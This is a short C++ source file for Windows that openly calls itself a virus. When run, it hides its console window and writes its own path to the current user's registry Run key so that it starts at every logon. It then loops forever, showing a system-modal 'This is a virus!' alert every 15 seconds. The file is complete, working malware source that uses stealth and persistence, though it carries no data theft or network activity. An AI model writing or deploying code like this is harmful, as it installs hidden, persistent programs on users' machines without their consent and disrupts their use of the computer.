#include <windows.h>
#include <iostream>

// The name used to identify the program in the system registry
constexpr LPCSTR APPLICATION_NAME = "VIRUS";

/**
 * Function: AddToStartup
 * ----------------------
 * This function registers the program with Windows so that it
 * starts automatically whenever a user logs into the computer.
 * * It works by:
 * 1. Finding the folder path where this specific file is located.
 * 2. Opening the Windows Registry "Run" key for the current user.
 * 3. Adding a new entry with the program's name and its location.
 */
static void AddToStartup() {
    HKEY registryKeyHandle;
    char executablePath[MAX_PATH];

    // Find the full file path of this program
    DWORD pathLength = GetModuleFileNameA(NULL, executablePath, MAX_PATH);
    if (pathLength == 0) {
        std::cerr << "cant find the path" << std::endl;
        return;
    }

    // Open the Windows Registry key that handles startup programs
    LSTATUS openResult = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &registryKeyHandle
    );

    if (openResult == ERROR_SUCCESS) {
        // Save the program path into the registry
        LSTATUS setResult = RegSetValueExA(
            registryKeyHandle,
            APPLICATION_NAME,
            0,
            REG_SZ,
            (const BYTE*)executablePath,
            (DWORD)(strlen(executablePath) + 1)
        );

        if (setResult == ERROR_SUCCESS) {
            std::cout << "done. it'll run on boot now" << std::endl;
        }
        else {
            std::cerr << "registry broke" << std::endl;
        }

        // Clean up and close the registry connection
        RegCloseKey(registryKeyHandle);
    }
    else {
        std::cerr << "cant open registry" << std::endl;
    }
}

int main(void) {
    // Hide the program window from the user's view
    HWND consoleWindowHandle = GetConsoleWindow();
    ShowWindow(consoleWindowHandle, SW_HIDE);

    // Setup the automatic startup
    AddToStartup();

    // Loop forever
    while (true) {
        // Wait for 15 seconds
        Sleep(15000);

        // Show an alert box that stays on top of all other windows
        MessageBoxA(
            NULL,
            "This is a virus!\n",
            "VIRUS",
            MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL
        );
    }

    return 0;
}